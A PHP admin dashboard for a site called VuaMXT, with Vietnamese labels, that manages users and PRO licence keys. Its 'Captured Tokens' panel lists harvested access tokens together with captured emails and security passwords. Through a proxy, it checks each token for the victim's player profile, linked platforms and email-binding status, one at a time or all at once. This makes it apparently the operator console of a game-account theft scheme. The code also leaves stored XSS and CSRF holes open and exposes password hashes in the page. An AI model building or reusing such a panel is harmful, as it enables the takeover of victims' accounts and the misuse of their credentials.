<?php
require_once __DIR__ . '/config.php';

define('TOKENS_FILE', __DIR__ . '/tokens.json');

session_start();

// 1. Xử lý Đăng nhập
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    if ($_POST['password'] === ADMIN_PASSWORD) $_SESSION['admin_logged'] = true;
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: ".$_SERVER['PHP_SELF']); exit; }

if (!isset($_SESSION['admin_logged'])) {
?>
<!DOCTYPE html>
<html>
<head>
    <title>Login - VuaMXT Admin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="dashboard.css"/>
</head>
<body>
    <div class="dot-pattern"></div>
    <div class="meteors-container">
        <div class="meteor" style="left: 10%; animation-delay: 0s; animation-duration: 8s;"></div>
        <div class="meteor" style="left: 30%; animation-delay: 2s; animation-duration: 10s;"></div>
        <div class="meteor" style="left: 50%; animation-delay: 4s; animation-duration: 7s;"></div>
        <div class="meteor" style="left: 70%; animation-delay: 1s; animation-duration: 9s;"></div>
        <div class="meteor" style="left: 90%; animation-delay: 3s; animation-duration: 11s;"></div>
    </div>
    <div class="login-card">
        <h2><i class="bi bi-shield-lock"></i> ADMIN ACCESS</h2>
        <form method="POST">
            <input type="password" name="password" class="form-control" placeholder="Mật khẩu quản trị..." required autofocus>
            <button type="submit" name="login">ĐĂNG NHẬP</button>
            <?php if(isset($_POST['login'])): ?>
                <div class="text-danger mt-3 text-center" style="font-size: 12px;">Mật khẩu không chính xác!</div>
            <?php endif; ?>
        </form>
    </div>
</body>
</html>
<?php
exit;
}

$db = new PDO("sqlite:" . DB_FILE);

// 2. Xử lý Thao tác
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['bulk_action'])) {
        $ids = $_POST['ids'] ?? [];
        if (!empty($ids)) {
            // WHITELIST TABLES TO PREVENT SQL INJECTION
            $allowed_tables = ['users', 'keys_store', 'bypass_tokens'];
            $table = $_POST['table_type'];
            
            if (in_array($table, $allowed_tables)) {
                $placeholders = implode(',', array_fill(0, count($ids), '?'));
                $stmt = $db->prepare("DELETE FROM $table WHERE id IN ($placeholders)");
                $stmt->execute($ids);
            }
        }
    }
    if (isset($_POST['update_user'])) {
        $pass = !empty($_POST['password']) ? password_hash($_POST['password'], PASSWORD_BCRYPT) : $_POST['old_password'];
        $db->prepare("UPDATE users SET username=?, email=?, password=? WHERE id=?")
           ->execute([$_POST['username'], $_POST['email'], $pass, $_POST['id']]);
    }
    if (isset($_POST['clear_tokens'])) {
        file_put_contents(TOKENS_FILE, json_encode([]));
    }
}
if (isset($_GET['action'])) {
    if ($_GET['action'] == 'toggle_pro') $db->prepare("UPDATE users SET is_pro = (is_pro + 1) % 2 WHERE id=?")->execute([$_GET['id']]);
    header("Location: ".$_SERVER['PHP_SELF']); exit;
}

// 3. Xử lý Gen Key
$generated_keys = [];
if (isset($_POST['gen'])) {
    $stmt = $db->prepare("INSERT INTO keys_store (key_code, is_used) VALUES (?, 0)");
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    for($i=0; $i<(int)$_POST['count']; $i++) {
        $b = fn() => substr(str_shuffle($chars), 0, 4);
        $key = "PRO-{$b()}-{$b()}-{$b()}-{$b()}";
        $stmt->execute([$key]);
        $generated_keys[] = $key;
    }
}

// 4. Lấy danh sách Access Tokens
$captured_tokens = [];
if (file_exists(TOKENS_FILE)) {
    $captured_tokens = json_decode(file_get_contents(TOKENS_FILE), true) ?: [];
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Admin Dashboard Pro - VuaMXT</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet"/>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="dashboard.css"/>
</head>
<body>
    <div class="dot-pattern"></div>
    <div class="meteors-container">
        <div class="meteor" style="left: 10%; animation-delay: 0s; animation-duration: 8s;"></div>
        <div class="meteor" style="left: 30%; animation-delay: 2s; animation-duration: 10s;"></div>
        <div class="meteor" style="left: 50%; animation-delay: 4s; animation-duration: 7s;"></div>
        <div class="meteor" style="left: 70%; animation-delay: 1s; animation-duration: 9s;"></div>
        <div class="meteor" style="left: 90%; animation-delay: 3s; animation-duration: 11s;"></div>
    </div>
    <div class="container-fluid">
        <div class="d-flex justify-content-between align-items-center mb-4">
            <h1><i class="bi bi-shield-lock"></i> VuaMXT Admin</h1>
            <div>
                <span class="me-3 text-muted" style="font-size: 12px;">Admin Session: <strong>Active</strong></span>
                <a href="?logout=1" class="btn btn-danger btn-sm"><i class="bi bi-power"></i> Đăng xuất</a>
            </div>
        </div>

        <div class="row">
            <!-- CỘT TRÁI: QUẢN LÝ HỆ THỐNG -->
            <div class="col-lg-7">
                <div class="card-custom">
                    <h3><i class="bi bi-people"></i> Quản lý Người dùng</h3>
                    <form method="POST">
                        <input type="hidden" name="table_type" value="users">
                        <div class="mb-2">
                            <button type="submit" name="bulk_action" class="btn btn-danger btn-sm" onclick="return confirm('Xóa các user đã chọn?')"><i class="bi bi-trash"></i> Xóa đã chọn</button>
                        </div>
                        <div class="table-responsive">
                            <table>
                                <tr><th><input type="checkbox" onclick="let c=document.getElementsByName('ids[]'); for(let i of c) i.checked=this.checked;"></th><th>Username</th><th>Email</th><th>Gói</th><th>Thao tác</th></tr>
                                <?php foreach($db->query("SELECT * FROM users") as $u): ?>
                                <tr>
                                    <td><input type="checkbox" name="ids[]" value="<?=$u['id']?>"></td>
                                    <input type="hidden" name="id" value="<?=$u['id']?>"><input type="hidden" name="old_password" value="<?=$u['password']?>">
                                    <td><input name="username" value="<?=$u['username']?>" style="width:90px"></td>
                                    <td><input name="email" value="<?=$u['email']?>" style="width:130px"></td>
                                    <td><?=$u['is_pro'] ? '<span class="tag-status tag-email">PRO VIP</span>' : '<span class="tag-status tag-pending">FREE</span>'?></td>
                                    <td>
                                        <button name="update_user" class="btn btn-primary btn-sm"><i class="bi bi-save"></i></button>
                                        <a href="?action=toggle_pro&id=<?=$u['id']?>" class="btn btn-info btn-sm">Gói</a>
                                    </td>
                                </tr>
                                <?php endforeach; ?>
                            </table>
                        </div>
                    </form>
                </div>

                <div class="card-custom">
                    <h3><i class="bi bi-key"></i> Quản lý Key PRO</h3>
                    <div class="row">
                        <div class="col-md-4">
                            <form method="POST" class="mb-3">
                                <label class="d-block mb-1" style="font-size: 11px;">Số lượng:</label>
                                <input type="number" name="count" value="5" min="1" style="width:100%" class="mb-2">
                                <button type="submit" name="gen" class="btn btn-success btn-sm w-100"><i class="bi bi-plus-lg"></i> Tạo Key Mới</button>
                            </form>
                        </div>
                        <div class="col-md-8">
                            <form method="POST">
                                <input type="hidden" name="table_type" value="keys_store">
                                <div class="table-responsive" style="max-height: 300px; overflow-y: auto;">
                                    <table>
                                        <tr><th><input type="checkbox" onclick="let c=document.getElementsByName('ids[]'); for(let i of c) i.checked=this.checked;"></th><th>Mã Key</th><th>Trạng thái</th></tr>
                                        <?php foreach($db->query("SELECT * FROM keys_store ORDER BY id DESC LIMIT 100") as $k): ?>
                                        <tr>
                                            <td><input type="checkbox" name="ids[]" value="<?=$k['id']?>"></td>
                                            <td><code style="color:var(--acc); font-size: 11px;"><?=$k['key_code']?></code></td>
                                            <td><?=$k['is_used'] ? '<span class="text-secondary">Đã dùng</span>' : '<span class="text-success">Sẵn sàng</span>'?></td>
                                        </tr>
                                        <?php endforeach; ?>
                                    </table>
                                </div>
                                <button type="submit" name="bulk_action" class="btn btn-danger btn-sm mt-2" onclick="return confirm('Xóa các key đã chọn?')"><i class="bi bi-trash"></i> Xóa Key đã chọn</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!-- CỘT PHẢI: LOG TOKEN THU THẬP -->
            <div class="col-lg-5">
                <div class="card-custom">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h3><i class="bi bi-database-down"></i> Captured Tokens</h3>
                        <div class="d-flex gap-2">
                            <button onclick="scanAllInfo()" class="btn btn-info btn-sm"><i class="bi bi-search"></i> Quét Hết</button>
                            <form method="POST">
                                <button type="submit" name="clear_tokens" class="btn btn-danger btn-sm" onclick="return confirm('Xóa sạch log token?')"><i class="bi bi-x-circle"></i> Xóa Log</button>
                            </form>
                        </div>
                    </div>

                    <div class="filter-bar">
                        <button class="filter-btn active" onclick="filterTokens('all')">Tất cả (<?=count($captured_tokens)?>)</button>
                        <button class="filter-btn" onclick="filterTokens('has-email')">Có Email</button>
                        <button class="filter-btn" onclick="filterTokens('no-email')">Không Email</button>
                        <button class="filter-btn" onclick="filterTokens('pending')">Đang chờ (15d)</button>
                    </div>

                    <div class="accordion" id="tokenAccordion" style="max-height: 700px; overflow-y: auto; padding-right: 5px;">
                        <?php if (empty($captured_tokens)): ?>
                            <div class="text-center text-muted py-5">
                                <i class="bi bi-inbox-fill" style="font-size: 40px; display: block; opacity: 0.2;"></i>
                                Chưa có dữ liệu thu thập.
                            </div>
                        <?php endif; ?>
                        
                        <?php foreach(array_reverse($captured_tokens) as $index => $log): 
                            $tk = is_array($log) ? $log['token'] : $log;
                            $email = is_array($log) ? ($log['email'] ?? '') : '';
                            $sec_pw = is_array($log) ? ($log['sec_pw'] ?? '') : '';
                            $action_name = is_array($log) ? ($log['action'] ?? '') : '';
                        ?>
                        <div class="gt-acc-item" data-token-val="<?=$tk?>" data-email-status="unknown">
                            <button class="gt-acc-btn collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#tk-<?=$index?>" onclick="loadTokenInfo('<?=$tk?>', <?=$index?>)">
                                <span class="acc-ico"><i class="bi bi-person-circle"></i></span>
                                <div style="flex: 1;">
                                    <div style="font-family: var(--mono); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 250px;"><?=substr($tk, 0, 35)?>...</div>
                                    <div class="summary-info" id="sum-<?=$index?>">
                                        <span class="text-muted small"><i class="bi bi-arrow-repeat spin"></i> Chờ quét...</span>
                                    </div>
                                </div>
                                <i class="bi bi-chevron-down acc-chevron"></i>
                            </button>
                            <div id="tk-<?=$index?>" class="accordion-collapse collapse" data-bs-parent="#tokenAccordion">
                                <div class="gt-acc-body">
                                    <?php if ($email || $sec_pw): ?>
                                    <div class="mb-3">
                                        <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Dữ liệu Capture:</label>
                                        <div class="gt-res" style="color:var(--grn); font-weight: bold;">
<?php if($email) echo "📧 Email: $email\n"; ?>
<?php if($sec_pw) echo "🔐 SecPW: $sec_pw\n"; ?>
<?php if($action_name) echo "🎬 Action: $action_name\n"; ?>
                                        </div>
                                    </div>
                                    <?php endif; ?>
                                    <div class="mb-3">
                                        <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Full Access Token:</label>
                                        <div class="gt-res" style="color: var(--acc);"><?=$tk?></div>
                                    </div>
                                    
                                    <div class="row g-2">
                                        <div class="col-12">
                                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Dữ liệu tài khoản (Player Info):</label>
                                            <div id="pinfo-<?=$index?>" class="gt-res">Đang tải...</div>
                                        </div>
                                        <div class="col-md-6">
                                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Liên kết (Platforms):</label>
                                            <div id="plat-<?=$index?>" class="gt-res">Đang tải...</div>
                                        </div>
                                        <div class="col-md-6">
                                            <label class="text-muted" style="font-size: 9px; text-transform: uppercase;">Email Bảo mật:</label>
                                            <div id="email-<?=$index?>" class="gt-res">Đang tải...</div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Generated Keys Modal -->
    <div class="modal" id="keysModal">
        <h3><i class="bi bi-check2-all"></i> Keys Đã Tạo</h3>
        <textarea id="keys_area" readonly style="width:100%; height:120px; font-family: var(--mono); font-size: 12px;"><?=implode("\n", $generated_keys)?></textarea><br><br>
        <div class="d-flex gap-2">
            <button class="btn btn-success btn-sm flex-grow-1" onclick="copyKeys()"><i class="bi bi-clipboard"></i> Sao chép tất cả</button>
            <button class="btn btn-secondary btn-sm" onclick="document.getElementById('keysModal').style.display='none'">Đóng</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
    const API = 'proxy.php';

    async function api(payload) {
        const r = await fetch(API, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
        return r.json();
    }

    function copyKeys() {
        document.getElementById('keys_area').select();
        document.execCommand('copy');
        alert('Đã copy danh sách key!');
    }

    async function loadTokenInfo(token, idx) {
        const pEl = document.getElementById(`pinfo-${idx}`);
        const plEl = document.getElementById(`plat-${idx}`);
        const emEl = document.getElementById(`email-${idx}`);
        const sumEl = document.getElementById(`sum-${idx}`);
        const parent = document.querySelector(`[data-bs-target="#tk-${idx}"]`).parentElement;

        if (pEl.dataset.loaded === "true") return;

        try {
            // 1. Fetch Player Info
            const r1 = await api({ action: 'access_to_jwt', access_token: token });
            if (r1.ok) {
                pEl.textContent = JSON.stringify(r1.data.decoded, null, 2);
                const nick = r1.data.decoded.nickname || 'Unknown';
                const reg = r1.data.decoded.lock_region || r1.data.decoded.region || '??';
                sumEl.innerHTML = `<span><i class="bi bi-person-fill"></i> ${nick}</span> <span class="badge bg-secondary">${reg}</span>`;
            } else { pEl.textContent = "Lỗi: " + r1.msg; }

            // 2. Fetch Platforms
            const r2 = await api({ action: 'check_platforms', access_token: token });
            if (r2.ok) {
                plEl.textContent = JSON.stringify(r2.data, null, 2);
                if(r2.data.main) sumEl.innerHTML += ` <span class="badge bg-primary">${r2.data.main}</span>`;
            } else { plEl.textContent = "Lỗi: " + r2.msg; }

            // 3. Fetch Email Status
            const r3 = await api({ action: 'check_email', access_token: token });
            if (r3.ok) {
                emEl.textContent = JSON.stringify(r3.data, null, 2);
                let tag = '';
                if (r3.data.email) {
                    tag = '<span class="tag-status tag-email">CÓ EMAIL</span>';
                    parent.setAttribute('data-email-status', 'has-email');
                } else if (r3.data.pending) {
                    tag = `<span class="tag-status tag-pending">PENDING (${r3.data.countdown}s)</span>`;
                    parent.setAttribute('data-email-status', 'pending');
                } else {
                    tag = '<span class="tag-status tag-no-email">KHÔNG EMAIL</span>';
                    parent.setAttribute('data-email-status', 'no-email');
                }
                sumEl.innerHTML += ' ' + tag;
            } else { emEl.textContent = "Lỗi: " + r3.msg; }

            pEl.dataset.loaded = "true";
        } catch (e) {
            pEl.textContent = "Lỗi kết nối: " + e.message;
        }
    }

    async function scanAllInfo() {
        const items = document.querySelectorAll('.gt-acc-item');
        for (let i = 0; i < items.length; i++) {
            const token = items[i].getAttribute('data-token-val');
            // Tìm index từ ID của button
            const btn = items[i].querySelector('.gt-acc-btn');
            const targetId = btn.getAttribute('data-bs-target');
            const idx = targetId.split('-')[1];
            
            await loadTokenInfo(token, idx);
            // Delay nhẹ để tránh bị limit hoặc lag trình duyệt
            await new Promise(r => setTimeout(r, 200));
        }
        alert('Đã quét xong toàn bộ danh sách!');
    }

    function filterTokens(type) {
        // Cập nhật UI button
        document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
        event.target.classList.add('active');

        const items = document.querySelectorAll('.gt-acc-item');
        items.forEach(item => {
            const status = item.getAttribute('data-email-status');
            if (type === 'all') {
                item.style.display = 'block';
            } else if (type === status) {
                item.style.display = 'block';
            } else {
                item.style.display = 'none';
            }
        });
    }
    </script>
</body>
</html>
